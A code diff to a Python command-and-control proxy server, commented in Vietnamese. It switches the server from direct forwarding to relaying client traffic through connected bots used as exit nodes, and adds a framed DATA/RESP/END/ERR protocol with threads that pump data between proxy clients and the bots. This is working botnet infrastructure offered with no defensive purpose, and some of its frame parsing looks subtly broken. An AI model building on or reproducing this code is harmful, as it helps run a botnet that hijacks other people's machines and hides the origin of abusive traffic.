@@ -44,9 +44,8 @@ class C2ProxyServer:
             'start_time': datetime.now()
         }
         
-        # Temporary: enable direct forward mode to validate proxy quickly
-        # When True, C2 will directly connect to targets instead of via bots
-        self.direct_mode = True
+        # Direct forward mode (should be False for real bot relaying)
+        self.direct_mode = False
         
         # Server sockets
         self.c2_socket = None
@@ -356,28 +355,32 @@ class C2ProxyServer:
             
     def handle_bot_commands(self, bot_id, bot_socket):
         """Xử lý commands từ bot"""
+        buffer = b""
         while self.running and bot_id in self.connected_bots:
             try:
-                data = bot_socket.recv(4096).decode().strip()
-                if not data:
+                chunk = bot_socket.recv(4096)
+                if not chunk:
                     break
-                    
-                if data == "PONG":
-                    # Update last seen
-                    self.connected_bots[bot_id]['last_seen'] = datetime.now()
-                    
-                elif data.startswith("PROXY_RESPONSE:"):
-                    # Nhận response từ bot
-                    self.handle_bot_proxy_response(bot_id, data)
-                    
-                elif data.startswith("PROXY_ERROR:"):
-                    # Nhận error từ bot
-                    self.handle_bot_proxy_error(bot_id, data)
-                    
-                elif data.startswith("HEALTH_REPORT:"):
-                    # Nhận health report từ bot
-                    self.handle_bot_health_report(bot_id, data[14:])
-                    
+                buffer += chunk
+                # Process frames: commands are ASCII lines, RESP frames are "RESP:<id>:\n<bytes>" until next header
+                # Handle line-based small commands first
+                while b"\n" in buffer:
+                    line, sep, remainder = buffer.partition(b"\n")
+                    text = line.decode(errors='ignore')
+                    if text.startswith("RESP:") or text.startswith("DATA:"):
+                        # This is a frame header that precedes binary; keep header in buffer for pump
+                        buffer = line + sep + remainder
+                        break
+                    buffer = remainder
+                    if text == "PONG":
+                        self.connected_bots[bot_id]['last_seen'] = datetime.now()
+                    elif text.startswith("PROXY_ERROR:"):
+                        self.handle_bot_proxy_error(bot_id, text)
+                    elif text.startswith("HEALTH_REPORT:"):
+                        self.handle_bot_health_report(bot_id, text[14:])
+                # Hand off remaining buffer (may contain RESP frames) to pump
+                self._pump_bot_to_client(bot_id, bot_socket, prebuffer=buffer)
+                buffer = b""
             except Exception as e:
                 print(f"❌ Error handling commands from bot {bot_id}: {e}")
                 break
@@ -738,12 +741,16 @@ class C2ProxyServer:
             bot_info = self.connected_bots[bot_id]
             bot_socket = bot_info['socket']
             
-            # Tạo command để gửi đến bot
+            # Tạo command để gửi đến bot (framed protocol)
             command = f"PROXY_REQUEST:{connection_id}:{connection['target_host']}:{connection['target_port']}:{str(connection['is_https']).lower()}\n"
-            bot_socket.send(command.encode())
-            
-            # Gửi request data
-            bot_socket.send(request_data)
+            bot_socket.sendall(command.encode())
+
+            # Gửi frame DATA đầu tiên (nếu là HTTP)
+            if not connection['is_https'] and request_data:
+                self._send_data_frame_to_bot(bot_socket, connection_id, request_data)
+
+            # Bắt đầu 2 chiều: client->bot (DATA frames) và bot->client (RESP frames)
+            threading.Thread(target=self._pump_client_to_bot, args=(connection_id,), daemon=True).start()
             
             # Update bot statistics
             self.bot_exit_nodes[bot_id]['connections'] += 1
@@ -754,34 +761,8 @@ class C2ProxyServer:
             self.stats['failed_requests'] += 1
             
     def handle_bot_proxy_response(self, bot_id, response_data):
-        """Xử lý response từ bot"""
-        try:
-            # Bot gửi theo định dạng: "PROXY_RESPONSE:<id>\n" + raw bytes tiếp theo
-            if response_data.startswith('PROXY_RESPONSE:'):
-                header, _, rest = response_data.partition('\n')
-                connection_id = header.split(':', 1)[1]
-                if connection_id in self.active_proxy_connections:
-                    connection = self.active_proxy_connections[connection_id]
-                    client_socket = connection['client_socket']
-                    # Ở đây chỉ có phần sau header ở buffer hiện tại; dữ liệu tiếp theo sẽ tiếp tục được stream bởi bot.
-                    # Nếu có phần rest (bytes sau newline đã đến), forward ngay phần đó.
-                    if rest:
-                        try:
-                            client_socket.send(rest.encode())
-                        except Exception:
-                            pass
-                    
-                    # Update statistics
-                    bytes_transferred = len(actual_response)
-                    connection['bytes_transferred'] += bytes_transferred
-                    self.stats['total_bytes_transferred'] += bytes_transferred
-                    
-                    # Update bot statistics
-                    self.bot_exit_nodes[bot_id]['successful_requests'] += 1
-                    self.connected_bots[bot_id]['bytes_transferred'] += bytes_transferred
-                    
-        except Exception as e:
-            print(f"❌ Error handling bot proxy response: {e}")
+        """Framed RESP handling is done in _pump_bot_to_client; keep method for compatibility"""
+        pass
             
     def handle_bot_proxy_error(self, bot_id, error_data):
         """Xử lý error từ bot"""
@@ -805,6 +786,98 @@ class C2ProxyServer:
                     
         except Exception as e:
             print(f"❌ Error handling bot proxy error: {e}")
+
+    def _send_data_frame_to_bot(self, bot_socket, connection_id, payload_bytes):
+        try:
+            header = f"DATA:{connection_id}:\n".encode()
+            bot_socket.sendall(header + payload_bytes)
+        except Exception as e:
+            print(f"❌ Error sending DATA frame to bot {connection_id}: {e}")
+
+    def _pump_client_to_bot(self, connection_id):
+        """Read from client socket and send DATA frames to bot until closed."""
+        try:
+            if connection_id not in self.active_proxy_connections:
+                return
+            conn = self.active_proxy_connections[connection_id]
+            client_sock = conn['client_socket']
+            bot_id = conn['bot_id']
+            bot_sock = self.connected_bots[bot_id]['socket']
+            while True:
+                data = client_sock.recv(4096)
+                if not data:
+                    # notify bot end
+                    try:
+                        bot_sock.sendall(f"END:{connection_id}\n".encode())
+                    except Exception:
+                        pass
+                    break
+                self._send_data_frame_to_bot(bot_sock, connection_id, data)
+        except Exception as e:
+            print(f"❌ pump client->bot error {connection_id}: {e}")
+
+    def _pump_bot_to_client(self, bot_id, bot_socket, prebuffer=b""):
+        """Parse RESP frames from bot and write to client."""
+        buffer = prebuffer
+        try:
+            while True:
+                if b"\n" not in buffer:
+                    chunk = bot_socket.recv(4096)
+                    if not chunk:
+                        break
+                    buffer += chunk
+                    continue
+                line, _, buffer = buffer.partition(b"\n")
+                header = line.decode(errors='ignore')
+                if header.startswith("RESP:"):
+                    # header: RESP:<id>:
+                    parts = header.split(":")
+                    if len(parts) < 3:
+                        continue
+                    connection_id = parts[1]
+                    # Read until next header start or socket close
+                    payload = b""
+                    while True:
+                        # Peek for next header line
+                        if b"\n" in buffer and (buffer.startswith(b"RESP:") or buffer.startswith(b"END:") or buffer.startswith(b"ERR:") or buffer.startswith(b"DATA:")):
+                            break
+                        if not buffer:
+                            chunk = bot_socket.recv(4096)
+                            if not chunk:
+                                break
+                            buffer += chunk
+                            continue
+                        payload += buffer
+                        buffer = b""
+                    # Write payload to client
+                    if connection_id in self.active_proxy_connections:
+                        try:
+                            client_sock = self.active_proxy_connections[connection_id]['client_socket']
+                            if payload:
+                                client_sock.sendall(payload)
+                                self.stats['total_bytes_transferred'] += len(payload)
+                        except Exception:
+                            pass
+                elif header.startswith("END:"):
+                    parts = header.split(":")
+                    if len(parts) >= 2:
+                        cid = parts[1]
+                        if cid in self.active_proxy_connections:
+                            self.cleanup_proxy_connection(cid)
+                elif header.startswith("ERR:"):
+                    parts = header.split(":", 2)
+                    cid = parts[1] if len(parts) > 1 else None
+                    if cid in self.active_proxy_connections:
+                        try:
+                            self.active_proxy_connections[cid]['client_socket'].sendall(b"HTTP/1.1 502 Bad Gateway\r\n\r\n")
+                        except Exception:
+                            pass
+                        self.cleanup_proxy_connection(cid)
+                else:
+                    # Ignore unknown headers
+                    pass
+        except Exception as e:
+            print(f"❌ pump bot->client error: {e}")
             
     def handle_bot_health_report(self, bot_id, health_data):
         """Xử lý health report từ bot"""
